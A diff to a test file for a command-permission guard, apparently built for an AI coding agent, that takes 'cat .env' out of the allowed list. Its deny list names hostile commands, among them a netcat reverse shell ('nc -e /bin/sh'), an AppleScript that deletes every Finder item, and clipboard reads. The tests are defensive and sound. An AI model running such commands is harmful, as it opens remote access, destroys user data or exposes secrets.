@@ -30,7 +30,8 @@ const MUST_NOT_RUN = [
   "ssh host", "scp a b:c", "nc -e /bin/sh host 1", "osascript -e 'tell application \"Finder\" to delete every item'", "open -a Terminal", "say hello", "afplay x.mp3", "pbpaste", "pbcopy < x",
 ];
 // Needed to build and fix a project: none of these may be blocked.
-const MUST_RUN = ["ls", "ls -la src", "cat package.json", "npm test", "npm run build", "node app.js", "bun test", "git status", "git diff", "git log --oneline", "grep -r foo src", "echo hi", "mkdir -p src/x", "touch a.txt", "cp a.txt b.txt", "mv a.txt b.txt", "rm a.txt", "pwd", "which node", "node --version", "npx tsc --noEmit", "python3 app.py", "head -20 README.md", "wc -l src/app.js", "sed -n 1,5p app.js", "node --test", "npm run lint", "tsc -p .", "cat .env", "rm -rf node_modules", "rm -rf dist build", "echo hi && npm test"];
+// ("cat .env" used to be here: since 22 Oct 2026 a task does not read a private settings file, see settings-file-guard.test.ts.)
+const MUST_RUN = ["ls", "ls -la src", "cat package.json", "npm test", "npm run build", "node app.js", "bun test", "git status", "git diff", "git log --oneline", "grep -r foo src", "echo hi", "mkdir -p src/x", "touch a.txt", "cp a.txt b.txt", "mv a.txt b.txt", "rm a.txt", "pwd", "which node", "node --version", "npx tsc --noEmit", "python3 app.py", "head -20 README.md", "wc -l src/app.js", "sed -n 1,5p app.js", "node --test", "npm run lint", "tsc -p .", "rm -rf node_modules", "rm -rf dist build", "echo hi && npm test"];
 
 describe("dangerous commands in disguise are never simply allowed", () => {
   for (const c of MUST_NOT_RUN) test(c, () => { expect(run(project(), c).decision, c).not.toBe("allow"); });
